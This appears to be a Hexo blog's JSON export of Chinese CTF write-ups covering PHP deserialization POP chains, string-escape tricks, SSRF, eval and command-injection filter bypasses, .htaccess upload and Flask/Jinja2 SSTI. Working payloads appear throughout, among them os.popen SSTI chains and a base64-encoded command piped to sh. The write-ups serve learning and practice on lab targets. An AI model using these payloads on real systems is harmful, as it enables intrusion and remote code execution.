{"meta":{"title":"Lcdm123","subtitle":"","description":"","author":"海马少年","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2020-12-21T15:53:05.000Z","updated":"2020-12-21T16:02:03.707Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-12-21T15:52:57.000Z","updated":"2020-12-21T16:02:21.270Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"GYCTF2020-Easyphp","slug":"GYCTF2020-Easyphp","date":"2020-12-21T15:33:58.000Z","updated":"2020-12-21T15:35:00.527Z","comments":true,"path":"2020/12/21/GYCTF2020-Easyphp/","link":"","permalink":"http://example.com/2020/12/21/GYCTF2020-Easyphp/","excerpt":"","text":"考点：php序列化pop链 序列化字符串逃逸 打开题目按照管理先扫描目录 使用dirsearch 扫描出来了 flag.php login.php 使用御剑什么都没有扫出来 使用dirbuster什么都没有 这个貌似是BUU平台问题…… 打开题目 发现登录框，尝试弱口令登录，并且爆破用户名与密码，查看图片 失败 查看大佬的wp，存在www.zip（没扫出来…………） 查看www.zip，解压后查看代码 关键代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//update.php$users=new User(); //创建类$users-&gt;update(); // 调用user类的update函数if($_SESSION[&#x27;login&#x27;]===1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; // user类的update函数public function update()&#123; //调用了getNewinfo函数 $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; //定义了一个UpdateHelper类 $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //这个功能还没有写完 先占坑 &#125;// 输入点 age 与 nickname 参数可控public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; //创建了一个Info类并且序列化使用safe过滤 return safe(serialize(new Info($age,$nickname))); &#125;function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125; // 字符串替换// Info 类class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; // 在对象上下文中调用不可访问的方法时触发 // __call 中的参数，$name 需要调用的方法的名称，$arguments是一个数组，其中包含传递给方法$name的参数 public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); //此处$argument[0]就为age &#125; &#125; 这里如何触发__call()函数 12345678910 // user类 // 把类当成字符串使用时触发，返回值需要为字符串 public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125;// 这里user类中调用了Info类中不存在的update函数，因此这里会自动调用__call()函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; $this-&gt;token=$_SESSION[&#x27;token&#x27;]; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;用户不存在!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;密码错误！&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //还没来得及写 &#125;&#125; 1234567891011121314Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;//这里如果sql为类的话就会调用user的__string()函数 pop 链思路 ：利用 UpdateHelper类的__destruct函数触发User类的__tostring函数再触发Info类的__call()函数 把 $this-&gt;CtrlCase实例化dbctrl 对象，再调用dbctrl类的login函数，通过查询语句把admin账户的密码查出来 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859//payload&lt;?phpclass User &#123; public $id; public $age = null; public $nickname = null; &#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname) &#123; $this-&gt;age = $age; $this-&gt;nickname = $nickname; &#125;&#125;class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql) &#123; $newInfo = unserialize($newInfo); $upDate = new dbCtrl(); &#125;&#125;class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;root&quot;; public $dbpass=&quot;root&quot;; public $database=&quot;test&quot;; public $name = &quot;admin&quot;; public $password; public $mysqli; public $token = &quot;admin&quot;; &#125;$db = new dbCtrl();$user = new User();$info = new Info(&quot;lcdm123&quot;,&quot;lcdm123&quot;);$updatehelper = new UpdateHelper(&quot;lcdm123&quot;,&quot;lcdm123&quot;);$info-&gt;CtrlCase = $db;$user-&gt;nickname = $info;$user-&gt;age = &quot;select password,id from user where username=?&quot;;$updatehelper-&gt;sql = $user;$realinfo = new Info(&quot;lcdm123&quot;,&quot;lcdm123&quot;);$realinfo-&gt;CtrlCase = $updatehelper;echo serialize($realinfo);//O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125; 最终payload 序列化逃逸 这样构造的原因：将之前的序列化字符串删除info的部分（因为传入参数时会自动构造info），添加（”;s:8:”CtrlCase”;）的原因是因为传入参数的时候没有CtrlCase参数，需要自己提前构造好利用php反序列化字符串逃逸的方法传入 1&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;unionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:&#123;s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:&#123;s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;nickname&quot;;s:7:&quot;lcdm123&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125; 传入payload，获取到密码的payload（需要手动删除后面的0-0） 获得密码 登录获取flag","categories":[],"tags":[]},{"title":"PHP反序列化POP链构造","slug":"PHP反序列化POP链构造","date":"2020-12-21T15:20:59.000Z","updated":"2020-12-21T15:22:09.369Z","comments":true,"path":"2020/12/21/PHP反序列化POP链构造/","link":"","permalink":"http://example.com/2020/12/21/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E6%9E%84%E9%80%A0/","excerpt":"构造PHP反序列化pop链 以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**但是如果关键代码不在魔术方法中**，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来","text":"构造PHP反序列化pop链 以前理解的序列化攻击更多是在魔术方法中出现的一些利用漏洞，因为自动调用从而触发的漏洞。**但是如果关键代码不在魔术方法中**，而在一个类的普通方法中，这时候需要找相同的函数名将类的属性与敏感函数的属性联系起来 常见的php魔法函数 构造pop链的关键 123456789__construct() 当一个对象创建时被调用__destruct() 当一个对象被销毁时调用__weakup() 使用unserialize时触发__sleep() 使用serialize时触发__call() 在对象上下文中调用不可访问的方法时触发__get() 从不可访问的属性读取数据__set() 将数据写入不可访问的属性__toString() 把类当成字符串使用时触发__invoke() 当脚本尝试将对象调用为函数时触发 构造pop链，首先要找到头和尾（用户传入参数的地方与最终要执行函数的地方），从头到尾进行反推 简单实例123456789101112131415161718192021222324252627282930313233&lt;?phpclass test1&#123; pubilc $a; function __construct() &#123; $this-&gt;a = new test2; &#125; function __toString() &#123; if(isset($this-&gt;a)) return $this-&gt;a-&gt;action(); &#125;&#125;class test2&#123; function action() &#123; echo &quot;Hello world!&quot;; &#125;&#125;class test3&#123; public $cmd function action() &#123; eval($this-&gt;cmd); &#125;&#125;unserialize($_GET[&#x27;d&#x27;]);?&gt; 这是一个简单的例子，通过test::__string() –&gt; test3::__action() 来构造pop链 12345678910111213141516// 构造pop链&lt;?phpclass test1&#123; public $a; function __construct() &#123; $this-&gt;a = new test3; &#125; &#125;class test3&#123; public $cmd = &#x27;&#x27;;&#125;$b = new test1;echo serialize($b);?&gt; 对于protect 与 private 序列化后 需要添加 %00","categories":[],"tags":[]},{"title":"Unctf-WEB","slug":"Unctf-WEB","date":"2020-11-30T14:03:36.000Z","updated":"2020-12-21T15:17:32.647Z","comments":true,"path":"2020/11/30/Unctf-WEB/","link":"","permalink":"http://example.com/2020/11/30/Unctf-WEB/","excerpt":"WEB[TOC]","text":"WEB[TOC] easy_ssrf源码 123456789101112131415&lt;?phpecho&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;;highlight_file(__FILE__);$url = $_GET[&#x27;url&#x27;];if(preg_match(&#x27;/unctf\\.com/&#x27;,$url))&#123; if(!preg_match(&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;,$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo(&#x27;error!!&#x27;); &#125;&#125;else&#123; echo(&quot;error&quot;);&#125;?&gt; SSRF 返回上级目录，读取文件 1payload:?url&#x3D;unctf.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag easyunserializ源码 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;easy&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;challenge&#x27;,&#x27;easychallenge&#x27;,$string);&#125; # 改变序列化中的字符$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; php反序列化字符串逃逸 序列化的特点：以 ; 为字段的分隔，以 } 为结尾，并且根据长度判断内容 超出部分不会被反序列化成功，说明反序列化的过程是有一定的识别范围的，范围之外都会被自动忽略 反序列化时长度不对应会报错 可以反序列化不存在的元素 12345678910111213141516171819202122232425262728293031323334353637# 过滤后字符增加时&lt;?phpfunction lemon($string)&#123; $lemon = &#x27;/p/i&#x27;; return preg_replace($lemon,&#x27;ww&#x27;,$string);&#125;$username = $_GET[&#x27;a&#x27;];$age = &#x27;20&#x27;;$user = array($username,$age);var_dump(serialize($user));echo &quot;&lt;br&gt;&quot;;$r = lemon(serialize($user));var_dump($r);var_dump(unserialize($r));?&gt;#### 第一种情况?a=apple时 string(35) &quot;a:2:&#123;i:0;s:5:&quot;apple&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;&lt;br&gt;string(37) &quot;a:2:&#123;i:0;s:5:&quot;awwwwle&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;bool(false) ### 报错 不能反序列化#### 第二种情况 &quot;;i:1;s:2:&quot;20&quot;;&#125; 16个字符 ?a=pppppppppppppppp&quot;;i:1;s:2:&quot;20&quot;;&#125;时 string(63) &quot;a:2:&#123;i:0;s:32:&quot;pppppppppppppppp&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;&lt;br&gt;string(79) &quot;a:2:&#123;i:0;s:32:&quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;;i:1;s:2:&quot;20&quot;;&#125;&quot;array(2) &#123; [0]=&gt; string(32) &quot;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&quot; [1]=&gt; string(2) &quot;20&quot;&#125; ### 成功反序列化 1234567891011121314151617181920212223242526272829303132333435# 过滤后字符串减少时&lt;?phpfunction str_rep($string)&#123; return preg_replace( &#x27;/lemon|shy/&#x27;,&#x27;&#x27;, $string);&#125;$test[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];$test[&#x27;sign&#x27;] = $_GET[&#x27;sign&#x27;]; $test[&#x27;number&#x27;] = &#x27;2020&#x27;;$tt=serialize($test);echo($tt);echo &#x27;&lt;br&gt;&#x27;;$temp = str_rep($tt);echo($temp);echo&#x27;&lt;br&gt;&#x27;;$fake = unserialize($temp);var_dump(($fake));?&gt; # 第一种情况 name=lemon&amp;sign=gogogo a:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:4:&quot;sign&quot;;s:6:&quot;gogogo&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125; a:3:&#123;s:4:&quot;name&quot;;s:5:&quot;&quot;;s:4:&quot;sign&quot;;s:6:&quot;gogogo&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125; bool(false) #lemon被替换 无法反序列化 #第二种情况 name=pika&amp;sign=&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125; a:3 &#123;s:4:&quot;name&quot;;s:4:&quot;pika&quot;;s:4:&quot;sign&quot;;s:27:&quot;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;a:3:&#123;s:4:&quot;name&quot;;s:4:&quot;pika&quot;;s:4:&quot;sign&quot;;s:27:&quot;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;array(3) &#123; [&quot;name&quot;]=&gt; string(4) &quot;pika&quot; [&quot;sign&quot;]=&gt; string(27) &quot;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;&quot; [&quot;number&quot;]=&gt; string(4) &quot;2020&quot; &#125; #第三种情况 name=shyshyshyshyshyshyshyshyshy&amp;sign=hello123&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;a:3:&#123;s:4:&quot;name&quot;;s:27:&quot;shyshyshyshyshyshyshyshyshy&quot;;s:4:&quot;sign&quot;;s:57:&quot;hello123&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;a:3:a:3:&#123;s:4:&quot;name&quot;;s:27:&quot;&quot;;s:4:&quot;sign&quot;;s:57:&quot;hello123&quot;;s:4:&quot;sign&quot;;s:4:&quot;eval&quot;;s:6:&quot;number&quot;;s:4:&quot;2000&quot;;&#125;&quot;;s:6:&quot;number&quot;;s:4:&quot;2020&quot;;&#125;array(3) &#123; [&quot;name&quot;]=&gt; string(27) &quot;&quot;;s:4:&quot;sign&quot;;s:57:&quot;hello123&quot; [&quot;sign&quot;]=&gt; string(4) &quot;eval&quot; [&quot;number&quot;]=&gt; string(4) &quot;2000&quot; &#125; 1payload：changechangechangechangechangechangechange&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125; babyeval123456789101112131415&lt;?php // flag在flag.php if(isset($_GET[&#x27;a&#x27;]))&#123; if(preg_match(&#x27;/\\(.*\\)/&#x27;, $_GET[&#x27;a&#x27;])) die(&#x27;hacker!!!&#x27;); ob_start(function($data)&#123; if (strpos($data, &#x27;flag&#x27;) !== false) return &#x27;ByeBye hacker&#x27;; return false; &#125;); eval($_GET[&#x27;a&#x27;]); &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 1payload: ?a&#x3D;echo &#96;cat flag.php|base64&#96;; # 注意最后需要引号，这样是完整的php代码 ezphp123456789101112&lt;?phpshow_source(__FILE__);$username &#x3D; &quot;admin&quot;;$password &#x3D; &quot;password&quot;;include(&quot;flag.php&quot;);$data &#x3D; isset($_POST[&#39;data&#39;])? $_POST[&#39;data&#39;]: &quot;&quot; ;$data_unserialize &#x3D; unserialize($data);if ($data_unserialize[&#39;username&#39;]&#x3D;&#x3D;$username&amp;&amp;$data_unserialize[&#39;password&#39;]&#x3D;&#x3D;$password)&#123; echo $flag;&#125;else&#123; echo &quot;username or password error!&quot;;&#125; php反序列化 弱等于 1payload: a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; flag.php里面将username与password修改了因此不能直接序列化 看代码感觉能直接序列化，但是结果就是不行，才尝试这个方法 easy_upload 本题禁止文件中出现某些字符，并且禁止了某些文件名 123使用 .htaccess 攻击 经过测试发现.htaccess可以上传*** .htaccess 文件内容可以换行输入 *** 一句话木马也可以简化 easyflask预备知识SSTI 开始时由于没有学ssti导致一头雾水，网上乱扒payload，结果显然失败（还是自己认真学一下吧） 预备知识 SSTI的解题步骤：找基本类—&gt;找子类—&gt;找可利用的子类模板 本题过滤了[] ‘ ‘ “” __ 使用 |attr(request.args.value) 绕过 首先查看基本类 12原来的语句：&#123;&#123;&#39;&#39;.__class__.base__&#125;&#125;绕过语句：&#123;&#123;()|attr(request.args.class)|attr(request.args.base)&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__ 找子类 12原句：&#123;&#123;&#39;&#39;.__class__.base__.__subclasses__()&#125;&#125;绕过：&#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__ 选择某一个子类 12原句：&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[199]&#125;&#125;输出第199个绕过: &#123;&#123;()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.getitem)(199)&#125;&#125;&amp;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;getitem&#x3D;__getitem__ 读取flag 12原句:&#123;&#123;warnings.catch_warnings.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat%20&#x2F;flag.txt&#39;).read()&quot;)&#125;&#125;绕过：&#123;&#123;(()|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()|attr(request.args.getitem)(166))|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.builtins)|attr(request.args.getitem)(request.args.eval)(request.args.param)&#125;&#125;&amp;class&#x3D;__class__&amp;base&#x3D;__base__&amp;sub&#x3D;__subclasses__&amp;getitem&#x3D;__getitem__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;builtins&#x3D;__builtins__&amp;eval&#x3D;eval&amp;param&#x3D;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read() 注意细心 千万不要把字母拼错 UN’s_online_tools 命令执行 绕过 1?url&#x3D;127|sort%09index.php 123查看flag的位置：?url&#x3D;127|ls%09..&#x2F;..&#x2F;..&#x2F;..&#x2F;获取flag：??url&#x3D;127.0.0|echo%09c29ydCAuLi8uLi8uLi8uLi9mbGFn|base64%09-d|sh# 使用base64绕过过滤 ezfind 此题很玄学 非预期 L0vephp 此题需要找到正确的入口(?action=) 查看源代码 发现了最后一段为base85编码 此题过滤了base64 所以这里采用 php://filter/convert.quoted-printable-encode/resource=flag.php 获取到了flag.php 再解码 发现flag是假的，并且看见了提示，使用hex解码 访问获得源代码 123456789101112131415161718192021222324252627&lt;?php error_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; 目前做到这里就不会了 ， 先空着等之后去学习一下大佬的wp eval长度限制绕过 12利用变长参数特性展开数组变长参数是PHP5.6新引入的新特性，php中可以使用func(...$arr)这样的方式将$arr数组展开成多个参数传入func函数 1234567891011121314151617传入样例：POST &#x2F;test.php?1[]&#x3D;test&amp;1[]&#x3D;var_dump($_SERVER);&amp;2&#x3D;assert HTTP&#x2F;1.1Host: localhost:8081Accept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 22param&#x3D;usort(...$_GET);usort() 使用用户定义的比较函数对数组进行排序usort(array,myfunction) array 必须填写，规定需要排序的数组 myfunction 可选，定义了一个可调用的比较函数的字符串 GET变量被展开成为了两个参数[&#39;test&#39;,&#39;var_dump($_SERVER)&#39;] 和 assert 传入了usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数的var_dump($_SERVER),即可执行函数。 开始解题 获取flag 直接使用 cat /f*","categories":[],"tags":[]},{"title":"SSTI-Study","slug":"SSTI-Study","date":"2020-11-12T11:56:14.000Z","updated":"2020-11-12T11:57:12.590Z","comments":true,"path":"2020/11/12/SSTI-Study/","link":"","permalink":"http://example.com/2020/11/12/SSTI-Study/","excerpt":"注入大致流程12341. 检测漏洞，寻找注入点2.查询基本类3.查找子类4.找到子类中可以读取文件或命令执行的模块 搭建的是vulhub的ssti靶场","text":"注入大致流程12341. 检测漏洞，寻找注入点2.查询基本类3.查找子类4.找到子类中可以读取文件或命令执行的模块 搭建的是vulhub的ssti靶场 查询注入点 查看基本类123?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[0]&#125;&#125; 查看子类123456查看所有子类?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.subclasses__()&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()&#125;&#125;查看某一个子类?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.subclasses__()[166]&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166]&#125;&#125; 查看166号子类的模板12?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__&#125;&#125; 查看166号子类的模板中的函数12?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;]&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[1].__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;]&#125;&#125; 利用函数构造payload1?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125; 理解不一定对 常见的payload12?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;?name&#x3D;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[166].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125; 后面还需要熟练掌握各种绕过方法","categories":[],"tags":[]},{"title":"源码泄露","slug":"源码泄露","date":"2020-10-31T14:01:05.000Z","updated":"2020-10-31T14:01:46.081Z","comments":true,"path":"2020/10/31/源码泄露/","link":"","permalink":"http://example.com/2020/10/31/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/","excerpt":".hg 源码泄露漏洞成因：hg init的时候会生成.hg","text":".hg 源码泄露漏洞成因：hg init的时候会生成.hg .git 源码泄露漏洞成因：在运行git init 初始化代码库的时候，会生成一个.git隐藏文件 .DS_Store文件泄露泄露成因：在发布代码时未删除文件夹中隐藏.DS_Store，被发现后，获取了敏感的文件名等信息 路径检查工具：dsstoreexp python ds_store_exp.py http://www.am0s.com/.DS_Store 网站备份压缩文件备份文件的后缀：.rar .zip .7z .tar.gz .bak .swp .txt .html SVN导致文件泄露Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 WEB-INF/web.xml泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 目录 内容 /WEB-INF/web.xml web应用配置文件，描述了servlet和其他的应用组件配置及命名规则 /WEB-INF/classes/ 站点所有用的 